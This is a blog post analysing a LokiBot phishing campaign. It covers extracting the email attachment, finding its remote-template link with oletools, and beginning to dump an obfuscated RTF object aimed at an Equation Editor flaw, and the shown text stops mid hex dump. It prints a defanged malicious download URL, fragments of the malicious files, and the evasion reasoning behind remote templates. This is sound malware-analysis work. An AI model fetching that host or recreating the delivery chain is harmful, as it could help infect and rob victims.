<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=theme-color content="#494f5c"><meta name=msapplication-TileColor content="#494f5c"><meta itemprop=name content="LokiBot Analysis"><meta itemprop=description content="Brief Introduction The initial delivery was via email, however this post is about analyzing the delivery stages, malware and some SECOPS fails from the LokiBot threat actors.
The high level killchain is as follows:
Spam/Phishing email Contains a malicious document Downloads a remote template Exploits Equation Editor vulnerability Drops LokiBot. Step 1. Extract the attachment from the email I don&rsquo;t want to go into too much detail however it is simple, extract the attachment from the email, I want to mention how to do this for that one reader that might not know :)"><meta itemprop=datePublished content="2022-08-05T20:17:30+04:00"><meta itemprop=dateModified content="2022-08-05T20:17:30+04:00"><meta itemprop=wordCount content="3515"><meta itemprop=image content="https://picsum.photos/1024/768/?random"><meta itemprop=keywords content="LokiBot,Malware,Credential Harvester,Analysis,Reverse Engineering,"><meta property="og:title" content="LokiBot Analysis"><meta property="og:description" content="Brief Introduction The initial delivery was via email, however this post is about analyzing the delivery stages, malware and some SECOPS fails from the LokiBot threat actors.
The high level killchain is as follows:
Spam/Phishing email Contains a malicious document Downloads a remote template Exploits Equation Editor vulnerability Drops LokiBot. Step 1. Extract the attachment from the email I don&rsquo;t want to go into too much detail however it is simple, extract the attachment from the email, I want to mention how to do this for that one reader that might not know :)"><meta property="og:type" content="article"><meta property="og:url" content="https://ivanvza.github.io/posts/lokibot_analysis/"><meta property="og:image" content="https://picsum.photos/1024/768/?random"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-08-05T20:17:30+04:00"><meta property="article:modified_time" content="2022-08-05T20:17:30+04:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://picsum.photos/1024/768/?random"><meta name=twitter:title content="LokiBot Analysis"><meta name=twitter:description content="Brief Introduction The initial delivery was via email, however this post is about analyzing the delivery stages, malware and some SECOPS fails from the LokiBot threat actors.
The high level killchain is as follows:
Spam/Phishing email Contains a malicious document Downloads a remote template Exploits Equation Editor vulnerability Drops LokiBot. Step 1. Extract the attachment from the email I don&rsquo;t want to go into too much detail however it is simple, extract the attachment from the email, I want to mention how to do this for that one reader that might not know :)"><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color><link rel="shortcut icon" href=/favicon.ico><title>LokiBot Analysis</title><link rel=stylesheet href=https://ivanvza.github.io/css/style.min.037b6ee8f8c1baab6a3d0a9da11c3ff18a7552471f16c59fd98538d5ce99208b.css integrity="sha256-A3tu6PjBuqtqPQqdoRw/8Yp1UkcfFsWf2YU41c6ZIIs=" crossorigin=anonymous><style>.bg-img{background-image:url(https://picsum.photos/1024/768/?random)}</style></head><body id=page><header id=site-header class="animated slideInUp"><div class="hdr-wrapper section-inner"><div class=hdr-left><div class=site-branding><a href=https://ivanvza.github.io>0xIvan</a></div><nav class="site-nav hide-in-mobile"><a href=https://ivanvza.github.io/posts/>Posts</a>
<a href=https://ivanvza.github.io/about/>About</a></nav></div><div class="hdr-right hdr-icons"><button id=img-btn class=hdr-btn title="Featured Image"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-image"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg></button><span class="hdr-social hide-in-mobile"><a href=https://twitter.com/viljoenivan target=_blank rel="noopener me" title=Twitter><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></a><a href=https://github.com/ivanvza target=_blank rel="noopener me" title=Github><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a></span><button id=menu-btn class=hdr-btn title=Menu><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></header><div id=mobile-menu class="animated fast"><ul><li><a href=https://ivanvza.github.io/posts/>Posts</a></li><li><a href=https://ivanvza.github.io/about/>About</a></li></ul></div><div class=bg-img></div><main class="site-main section-inner animated fadeIn faster"><article class=thin><header class=post-header><div class=post-meta><span>Aug 5, 2022</span></div><h1>LokiBot Analysis</h1></header><div class=content><h2 id=brief-introduction>Brief Introduction<a href=#brief-introduction class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>The initial delivery was via email, however this post is about analyzing the delivery stages, malware and some SECOPS fails from the LokiBot threat actors.</p><p>The high level killchain is as follows:</p><ol><li>Spam/Phishing email</li><li>Contains a malicious document</li><li>Downloads a remote template</li><li>Exploits Equation Editor vulnerability</li><li>Drops LokiBot.</li></ol><h2 id=step-1-extract-the-attachment-from-the-email>Step 1. Extract the attachment from the email<a href=#step-1-extract-the-attachment-from-the-email class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>I don&rsquo;t want to go into too much detail however it is simple, extract the attachment from the email, I want to mention how to do this for that one reader that might not know :)</p><p>Somewhere in the mail headers you will see something like this:</p><pre tabindex=0><code>&lt;snip&gt;
--=_992495f41efb31bdba85371179868e6e
Content-Transfer-Encoding: base64
Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document;
 name=&#34;Payment advice_1.docx&#34;
Content-Disposition: attachment; filename=&#34;Payment advice_1.docx&#34;; size=73762

UEsDBBQAAgAIAHJ1/FRtFkuTcAEAAL8FAAATABEAW0NvbnRlbnRfVHlwZXNdLnhtbFVUDQAHnaDi
Yp2g4mKdoOJitZTLbsIwEEX3lfoPkbdVYuiiqioCiz6WLVLpB5h4Alb9kse8/r5jXqoQJGqBTaJk
5t57JrGmN1ganc0hoHK2ZN2iwzKwlZPKTkr2NXrLH1mGUVgptLNQshUgG/Rvb3qjlQfMSG2xZNMY
/RPnWE3BCCycB0uV2gUjIj2GCfei+hYT4PedzgOvnI1gYx6TB+v3XqAWMx2z1yW93pCAqVn2vOlL
USVTJumXearwo5oAGg9EwnutKhGpzudWHpDlW6qClOsenCqPd9RwIiFVTgc06DQu/0bm6lpVIF01
&lt;snip&gt;
AQAAAA==
--=_992495f41efb31bdba85371179868e6e--
</code></pre><p>As you can see this is generally <code>Base64</code> encoded, between 2 The Multipart Content-Type headers, we can easily extract the attachment by doing something like this:</p><pre tabindex=0><code>cat Email\ Header.txt| awk &#39;/Content-Disposition:/,/--=_/&#39; | tail -n +2 | tail -r | tail -n +2 | tail -r | base64 -d &gt; loki_attachment.docx
</code></pre><p>To explain what is happening here:</p><ol><li>Printing the entire output to stdout</li><li>With AWK, we are grabbing the contents between <code>Content-Disposition:</code> and <code>--=_</code></li><li><code>tail -f +2</code> cuts the last line off, which is the trailing <code>--=_</code></li><li>Reverse the entire order of the output (a little cheat to cut the top part)</li><li>Doing some more cutting to, and then reversing it again to get the output back in the same order as originally</li><li>Decrypting the <code>base64</code> content and then piping it into our <code>.docx</code> file.</li></ol><h2 id=step-2-diving-into-the-initial-document>Step 2. Diving into the initial document<a href=#step-2-diving-into-the-initial-document class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>So I use a Docker container from <a href=https://docs.remnux.org/install-distro/remnux-as-a-container>Remnux</a>, which comes pre-installed and configured with a bunch of tools for our analysis.</p><p>Here is an alias I use in my <code>.zshrc</code> to spin this container up and mapping my current folder as a volume:</p><pre tabindex=0><code>alias docker_RE=&#39;docker run --rm -it -u remnux -v &#34;$PWD:/home/remnux/files&#34; remnux/remnux-distro:focal bash&#39;
</code></pre><p>We are going to use <a href=https://github.com/decalage2/oletools/wiki/oleid>oleid</a> to see if the document is encrypted, has VBA Macros / XLM Macros or External Relationships embedded.</p><p>The <a href=http://www.decalage.info/python/oletools>oletools</a> suite is a package of python tools to analyze Microsoft OLE2 files (also called Structured Storage, Compound File Binary Format or Compound Document File Format), such as Microsoft Office documents or Outlook messages, mainly for malware analysis and debugging.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ oleid loki_attachment.docx
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Filename: loki_attachment.docx
</span></span><span class=line><span class=cl>--------------------+--------------------+----------+--------------------------
</span></span><span class=line><span class=cl>Indicator           <span class=p>|</span>Value               <span class=p>|</span>Risk      <span class=p>|</span>Description
</span></span><span class=line><span class=cl>--------------------+--------------------+----------+--------------------------
</span></span><span class=line><span class=cl>File format         <span class=p>|</span>MS Word 2007+       <span class=p>|</span>info      <span class=p>|</span>
</span></span><span class=line><span class=cl>                    <span class=p>|</span>Document <span class=o>(</span>.docx<span class=o>)</span>    <span class=p>|</span>          <span class=p>|</span>
</span></span><span class=line><span class=cl>--------------------+--------------------+----------+--------------------------
</span></span><span class=line><span class=cl>Container format    <span class=p>|</span>OpenXML             <span class=p>|</span>info      <span class=p>|</span>Container <span class=nb>type</span>
</span></span><span class=line><span class=cl>--------------------+--------------------+----------+--------------------------
</span></span><span class=line><span class=cl>Encrypted           <span class=p>|</span>False               <span class=p>|</span>none      <span class=p>|</span>The file is not encrypted
</span></span><span class=line><span class=cl>--------------------+--------------------+----------+--------------------------
</span></span><span class=line><span class=cl>VBA Macros          <span class=p>|</span>No                  <span class=p>|</span>none      <span class=p>|</span>This file does not contain
</span></span><span class=line><span class=cl>                    <span class=p>|</span>                    <span class=p>|</span>          <span class=p>|</span>VBA macros.
</span></span><span class=line><span class=cl>--------------------+--------------------+----------+--------------------------
</span></span><span class=line><span class=cl>XLM Macros          <span class=p>|</span>No                  <span class=p>|</span>none      <span class=p>|</span>This file does not contain
</span></span><span class=line><span class=cl>                    <span class=p>|</span>                    <span class=p>|</span>          <span class=p>|</span>Excel 4/XLM macros.
</span></span><span class=line><span class=cl>--------------------+--------------------+----------+--------------------------
</span></span><span class=line><span class=cl>External            <span class=p>|</span><span class=m>1</span>                   <span class=p>|</span>HIGH      <span class=p>|</span>External relationships
</span></span><span class=line><span class=cl>Relationships       <span class=p>|</span>                    <span class=p>|</span>          <span class=p>|</span>found: attachedTemplate -
</span></span><span class=line><span class=cl>                    <span class=p>|</span>                    <span class=p>|</span>          <span class=p>|</span>use oleobj <span class=k>for</span> details
</span></span><span class=line><span class=cl>--------------------+--------------------+----------+--------------------------
</span></span></code></pre></div><p>With the above output we can see that there is indeed an external relationship, which means that the word document downloads a remote template.</p><h3 id=why-this-technique>Why this technique?<a href=#why-this-technique class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><blockquote><p>The advantage of this technique is that the actual decoy Word document that touches the disk of the victim and read is not malicious. Thus, the chances of the attachment bypassing Email Gateways and/or host AV/EDR solutions increases than the traditional malicious Word Document.</p></blockquote><p>Let&rsquo;s extract the remote template URL with <a href=https://github.com/decalage2/oletools/wiki/oleobj>oleobj</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ oleobj loki_attachment.docx
</span></span><span class=line><span class=cl>-------------------------------------------------------------------------------
</span></span><span class=line><span class=cl>File: <span class=s1>&#39;loki_attachment.docx&#39;</span>
</span></span><span class=line><span class=cl>Found relationship <span class=s1>&#39;attachedTemplate&#39;</span> with external link hxxp://192<span class=o>[</span>.<span class=o>]</span>3<span class=o>[</span>.<span class=o>]</span>122<span class=o>[</span>.<span class=o>]</span>162/receipt/doc_50.doc
</span></span></code></pre></div><h2 id=step-3-diving-into-the-second-document-template>Step 3. Diving into the second document (Template)<a href=#step-3-diving-into-the-second-document-template class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ oleid doc_50.doc
</span></span><span class=line><span class=cl>XLMMacroDeobfuscator: pywin32 is not installed <span class=o>(</span>only is required <span class=k>if</span> you want to use MS Excel<span class=o>)</span>
</span></span><span class=line><span class=cl>oleid 0.60.1 - http://decalage.info/oletools
</span></span><span class=line><span class=cl>THIS IS WORK IN PROGRESS - Check updates regularly!
</span></span><span class=line><span class=cl>Please report any issue at https://github.com/decalage2/oletools/issues
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Filename: doc_50.doc
</span></span><span class=line><span class=cl>--------------------+--------------------+----------+--------------------------
</span></span><span class=line><span class=cl>Indicator           <span class=p>|</span>Value               <span class=p>|</span>Risk      <span class=p>|</span>Description
</span></span><span class=line><span class=cl>--------------------+--------------------+----------+--------------------------
</span></span><span class=line><span class=cl>File format         <span class=p>|</span>Rich Text Format    <span class=p>|</span>info      <span class=p>|</span>
</span></span><span class=line><span class=cl>--------------------+--------------------+----------+--------------------------
</span></span><span class=line><span class=cl>Container format    <span class=p>|</span>RTF                 <span class=p>|</span>info      <span class=p>|</span>Container <span class=nb>type</span>
</span></span><span class=line><span class=cl>--------------------+--------------------+----------+--------------------------
</span></span><span class=line><span class=cl>Encrypted           <span class=p>|</span>False               <span class=p>|</span>none      <span class=p>|</span>The file is not encrypted
</span></span><span class=line><span class=cl>--------------------+--------------------+----------+--------------------------
</span></span><span class=line><span class=cl>VBA Macros          <span class=p>|</span>No                  <span class=p>|</span>none      <span class=p>|</span>RTF files cannot contain
</span></span><span class=line><span class=cl>                    <span class=p>|</span>                    <span class=p>|</span>          <span class=p>|</span>VBA macros
</span></span><span class=line><span class=cl>--------------------+--------------------+----------+--------------------------
</span></span><span class=line><span class=cl>XLM Macros          <span class=p>|</span>No                  <span class=p>|</span>none      <span class=p>|</span>RTF files cannot contain
</span></span><span class=line><span class=cl>                    <span class=p>|</span>                    <span class=p>|</span>          <span class=p>|</span>XLM macros
</span></span><span class=line><span class=cl>--------------------+--------------------+----------+--------------------------
</span></span><span class=line><span class=cl>External            <span class=p>|</span><span class=m>0</span>                   <span class=p>|</span>none      <span class=p>|</span>External relationships
</span></span><span class=line><span class=cl>Relationships       <span class=p>|</span>                    <span class=p>|</span>          <span class=p>|</span>such as remote templates,
</span></span><span class=line><span class=cl>                    <span class=p>|</span>                    <span class=p>|</span>          <span class=p>|</span>remote OLE objects, etc
</span></span><span class=line><span class=cl>--------------------+--------------------+----------+--------------------------
</span></span></code></pre></div><p>A lot of malicious RTF files are obfuscated. With this sample rtfobj or rtfdump could not handle properly to correctly identify OLE objects (&ldquo;Not a well-formed OLE object&rdquo;). But the <a href=https://github.com/DidierStevens/DidierStevensSuite/blob/master/rtfdump.py>rtfdump</a> tool has an option that can help decode objects that are not well-formed.</p><p>Let&rsquo;s take a closer look, rtfdump does not identify OLE objects in this sample, however, the <code>h=</code> indicator tells us that there are a lot of hexadecimal characters, the interesting level we will look into is <code>Level 3</code>, reason for that is it is the inner most nested object with <code>15545</code> hex characters. We can always look at the other objects when we don&rsquo;t find something.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ rtfdump.py doc_50.doc
</span></span><span class=line><span class=cl>    <span class=m>1</span> Level  <span class=m>1</span>        <span class=nv>c</span><span class=o>=</span>    <span class=m>1</span> <span class=nv>p</span><span class=o>=</span><span class=m>00000000</span> <span class=nv>l</span><span class=o>=</span>   <span class=m>20542</span> <span class=nv>h</span><span class=o>=</span>    8457<span class=p>;</span>      <span class=m>18</span> <span class=nv>b</span><span class=o>=</span>       <span class=m>0</span>   <span class=nv>u</span><span class=o>=</span>    <span class=m>4064</span> <span class=se>\r</span>t
</span></span><span class=line><span class=cl>    <span class=m>2</span>  Level  <span class=m>2</span>       <span class=nv>c</span><span class=o>=</span>    <span class=m>1</span> <span class=nv>p</span><span class=o>=</span><span class=m>00001312</span> <span class=nv>l</span><span class=o>=</span>   <span class=m>15659</span> <span class=nv>h</span><span class=o>=</span>    7383<span class=p>;</span>      <span class=m>18</span> <span class=nv>b</span><span class=o>=</span>       <span class=m>0</span>   <span class=nv>u</span><span class=o>=</span>     <span class=m>260</span> <span class=se>\o</span>bject51717743
</span></span><span class=line><span class=cl>    <span class=m>3</span>   Level  <span class=m>3</span>      <span class=nv>c</span><span class=o>=</span>    <span class=m>5</span> <span class=nv>p</span><span class=o>=</span><span class=m>00001383</span> <span class=nv>l</span><span class=o>=</span>   <span class=m>15545</span> <span class=nv>h</span><span class=o>=</span>    7383<span class=p>;</span>      <span class=m>18</span> <span class=nv>b</span><span class=o>=</span>       <span class=m>0</span>   <span class=nv>u</span><span class=o>=</span>     <span class=m>260</span> <span class=se>\*\o</span>bjdata141307
</span></span><span class=line><span class=cl>    <span class=m>4</span>    Level  <span class=m>4</span>     <span class=nv>c</span><span class=o>=</span>    <span class=m>1</span> <span class=nv>p</span><span class=o>=</span><span class=m>00001395</span> <span class=nv>l</span><span class=o>=</span>     <span class=m>151</span> <span class=nv>h</span><span class=o>=</span>      26<span class=p>;</span>      <span class=m>18</span> <span class=nv>b</span><span class=o>=</span>       <span class=m>0</span>   <span class=nv>u</span><span class=o>=</span>      <span class=m>53</span>
</span></span><span class=line><span class=cl>    <span class=m>5</span>     Level  <span class=m>5</span>    <span class=nv>c</span><span class=o>=</span>    <span class=m>1</span> <span class=nv>p</span><span class=o>=</span><span class=m>00001396</span> <span class=nv>l</span><span class=o>=</span>     <span class=m>149</span> <span class=nv>h</span><span class=o>=</span>      26<span class=p>;</span>      <span class=m>18</span> <span class=nv>b</span><span class=o>=</span>       <span class=m>0</span>   <span class=nv>u</span><span class=o>=</span>      <span class=m>53</span>
</span></span><span class=line><span class=cl>    <span class=m>6</span>      Level  <span class=m>6</span>   <span class=nv>c</span><span class=o>=</span>    <span class=m>1</span> <span class=nv>p</span><span class=o>=</span><span class=m>00001397</span> <span class=nv>l</span><span class=o>=</span>     <span class=m>147</span> <span class=nv>h</span><span class=o>=</span>      26<span class=p>;</span>      <span class=m>18</span> <span class=nv>b</span><span class=o>=</span>       <span class=m>0</span>   <span class=nv>u</span><span class=o>=</span>      <span class=m>53</span> <span class=se>\b</span>in00
</span></span><span class=line><span class=cl>    <span class=m>7</span>       Level  <span class=m>7</span>  <span class=nv>c</span><span class=o>=</span>    <span class=m>0</span> <span class=nv>p</span><span class=o>=</span>000013a1 <span class=nv>l</span><span class=o>=</span>      <span class=m>19</span> <span class=nv>h</span><span class=o>=</span>       0<span class=p>;</span>       <span class=m>0</span> <span class=nv>b</span><span class=o>=</span>       <span class=m>0</span>   <span class=nv>u</span><span class=o>=</span>       <span class=m>0</span> <span class=se>\*\o</span>bjdata141307
</span></span><span class=line><span class=cl>    <span class=m>8</span>    Level  <span class=m>4</span>     <span class=nv>c</span><span class=o>=</span>    <span class=m>1</span> <span class=nv>p</span><span class=o>=</span>0000142f <span class=nv>l</span><span class=o>=</span>      <span class=m>56</span> <span class=nv>h</span><span class=o>=</span>      18<span class=p>;</span>      <span class=m>18</span> <span class=nv>b</span><span class=o>=</span>       <span class=m>0</span>   <span class=nv>u</span><span class=o>=</span>       <span class=m>0</span>
</span></span><span class=line><span class=cl>    <span class=m>9</span>     Level  <span class=m>5</span>    <span class=nv>c</span><span class=o>=</span>    <span class=m>1</span> <span class=nv>p</span><span class=o>=</span><span class=m>00001430</span> <span class=nv>l</span><span class=o>=</span>      <span class=m>54</span> <span class=nv>h</span><span class=o>=</span>      18<span class=p>;</span>      <span class=m>18</span> <span class=nv>b</span><span class=o>=</span>       <span class=m>0</span>   <span class=nv>u</span><span class=o>=</span>       <span class=m>0</span>
</span></span><span class=line><span class=cl>   <span class=m>10</span>      Level  <span class=m>6</span>   <span class=nv>c</span><span class=o>=</span>    <span class=m>0</span> <span class=nv>p</span><span class=o>=</span><span class=m>00001431</span> <span class=nv>l</span><span class=o>=</span>      <span class=m>52</span> <span class=nv>h</span><span class=o>=</span>      18<span class=p>;</span>      <span class=m>18</span> <span class=nv>b</span><span class=o>=</span>       <span class=m>0</span>   <span class=nv>u</span><span class=o>=</span>       <span class=m>0</span> <span class=se>\*\n</span>onsartlrun221714552
</span></span><span class=line><span class=cl>   <span class=m>11</span>    Level  <span class=m>4</span>     <span class=nv>c</span><span class=o>=</span>    <span class=m>1</span> <span class=nv>p</span><span class=o>=</span>0000146a <span class=nv>l</span><span class=o>=</span>     <span class=m>390</span> <span class=nv>h</span><span class=o>=</span>      73<span class=p>;</span>       <span class=m>6</span> <span class=nv>b</span><span class=o>=</span>       <span class=m>0</span>   <span class=nv>u</span><span class=o>=</span>     <span class=m>169</span>
</span></span><span class=line><span class=cl>   <span class=m>12</span>     Level  <span class=m>5</span>    <span class=nv>c</span><span class=o>=</span>    <span class=m>1</span> <span class=nv>p</span><span class=o>=</span>0000146b <span class=nv>l</span><span class=o>=</span>     <span class=m>388</span> <span class=nv>h</span><span class=o>=</span>      73<span class=p>;</span>       <span class=m>6</span> <span class=nv>b</span><span class=o>=</span>       <span class=m>0</span>   <span class=nv>u</span><span class=o>=</span>     <span class=m>169</span>
</span></span><span class=line><span class=cl>   <span class=m>13</span>      Level  <span class=m>6</span>   <span class=nv>c</span><span class=o>=</span>    <span class=m>0</span> <span class=nv>p</span><span class=o>=</span>0000146c <span class=nv>l</span><span class=o>=</span>     <span class=m>386</span> <span class=nv>h</span><span class=o>=</span>     125<span class=p>;</span>       <span class=m>6</span> <span class=nv>b</span><span class=o>=</span>       <span class=m>0</span>   <span class=nv>u</span><span class=o>=</span>     <span class=m>256</span> <span class=se>\*\h</span>o
</span></span><span class=line><span class=cl>   <span class=m>14</span>    Level  <span class=m>4</span>     <span class=nv>c</span><span class=o>=</span>    <span class=m>1</span> <span class=nv>p</span><span class=o>=</span><span class=m>00001644</span> <span class=nv>l</span><span class=o>=</span>     <span class=m>181</span> <span class=nv>h</span><span class=o>=</span>       0<span class=p>;</span>      <span class=m>12</span> <span class=nv>b</span><span class=o>=</span>       <span class=m>0</span>   <span class=nv>u</span><span class=o>=</span>       <span class=m>0</span> <span class=se>\o</span>bject
</span></span><span class=line><span class=cl>   <span class=m>15</span>     Level  <span class=m>5</span>    <span class=nv>c</span><span class=o>=</span>    <span class=m>0</span> <span class=nv>p</span><span class=o>=</span>000016b5 <span class=nv>l</span><span class=o>=</span>      <span class=m>67</span> <span class=nv>h</span><span class=o>=</span>       0<span class=p>;</span>       <span class=m>8</span> <span class=nv>b</span><span class=o>=</span>       <span class=m>0</span>   <span class=nv>u</span><span class=o>=</span>       <span class=m>0</span>
</span></span><span class=line><span class=cl>   <span class=m>16</span>    Level  <span class=m>4</span>     <span class=nv>c</span><span class=o>=</span>    <span class=m>1</span> <span class=nv>p</span><span class=o>=</span><span class=m>00001769</span> <span class=nv>l</span><span class=o>=</span>      <span class=m>82</span> <span class=nv>h</span><span class=o>=</span>      22<span class=p>;</span>      <span class=m>12</span> <span class=nv>b</span><span class=o>=</span>       <span class=m>0</span>   <span class=nv>u</span><span class=o>=</span>      <span class=m>37</span>
</span></span><span class=line><span class=cl>   <span class=m>17</span>     Level  <span class=m>5</span>    <span class=nv>c</span><span class=o>=</span>    <span class=m>1</span> <span class=nv>p</span><span class=o>=</span>0000176a <span class=nv>l</span><span class=o>=</span>      <span class=m>80</span> <span class=nv>h</span><span class=o>=</span>      22<span class=p>;</span>      <span class=m>12</span> <span class=nv>b</span><span class=o>=</span>       <span class=m>0</span>   <span class=nv>u</span><span class=o>=</span>      <span class=m>37</span>
</span></span><span class=line><span class=cl>   <span class=m>18</span>      Level  <span class=m>6</span>   <span class=nv>c</span><span class=o>=</span>    <span class=m>0</span> <span class=nv>p</span><span class=o>=</span>0000176b <span class=nv>l</span><span class=o>=</span>      <span class=m>78</span> <span class=nv>h</span><span class=o>=</span>      22<span class=p>;</span>       <span class=m>7</span> <span class=nv>b</span><span class=o>=</span>       <span class=m>0</span>   <span class=nv>u</span><span class=o>=</span>      <span class=m>37</span> <span class=se>\e</span>mspace610134477
</span></span></code></pre></div><p>a quick breakdown of the below command is as follows:</p><pre tabindex=0><code>-s3: select item nr for dumping, in our case Level 3
-H: decode hexadecimal data
</code></pre><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ rtfdump.py -s3 -H doc_50.doc
</span></span><span class=line><span class=cl>&lt;snip&gt;
</span></span><span class=line><span class=cl>00000460: FF FF FF F5 <span class=m>20</span> <span class=m>06</span> F0 <span class=m>06</span>  F0 <span class=m>07</span> <span class=m>40</span> <span class=m>02</span> <span class=m>00</span> <span class=m>04</span> <span class=m>50</span> <span class=m>06</span>  .... .....@...P.
</span></span><span class=line><span class=cl>00000470: E0 <span class=m>07</span> <span class=m>40</span> <span class=m>07</span> <span class=m>20</span> <span class=m>07</span> <span class=m>90</span> <span class=m>00</span>  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  ..@. ...........
</span></span><span class=line><span class=cl>00000480: <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  ................
</span></span><span class=line><span class=cl>00000490: <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  ................
</span></span><span class=line><span class=cl>000004A0: <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>01</span> <span class=m>60</span> <span class=m>00</span> <span class=m>50</span> 0F  FF FF FF FF FF FF FF F0  ....<span class=sb>`</span>.P.........
</span></span><span class=line><span class=cl>000004B0: <span class=m>10</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> 2C E0 <span class=m>20</span> <span class=m>00</span>  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> 0C <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  ....,. .........
</span></span><span class=line><span class=cl>000004C0: <span class=m>00</span> <span class=m>00</span> <span class=m>04</span> <span class=m>60</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>07</span>  ...<span class=sb>`</span>............
